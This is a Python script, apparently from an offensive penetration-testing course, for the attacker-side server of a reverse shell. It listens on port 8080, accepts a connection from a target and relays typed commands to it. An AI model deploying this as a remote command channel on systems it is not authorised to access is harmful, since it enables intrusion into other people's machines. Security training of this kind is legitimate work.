# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic TCP Server 


import socket # For Building TCP Connection



def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
    host=socket.gethostname()
    ip_adrr='172.16.110.224'
    print(host,ip_adrr)
    port=8080
    s.bind((ip_adrr, port)) 

    s.listen(5) # define the backlog size, since we are expecting a single connection from a single
                                                            # target we will listen to one connection

    print ('[+] Listening for incoming TCP connection on port 8080')

    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
                                # port in a tuple format (IP,port)

    print ('[+] We got a connection from: ', addr)

    while True:

        command = (input("Shell> ")) # Get user input and store it in command variable

        if ('bye' in (command)): # If we got terminate command, inform the client and close the connect and break the loop
            conn.send(bytearray('bye', encoding='utf-8'))
            conn.close()
            break

        else:
            conn.send(bytearray(command, encoding='utf-8')) # Otherwise we will send the command to the target
            print(command)
            print (conn.recv(1024).decode()) # and print the result that we got back
           

def main ():
    connect()
main()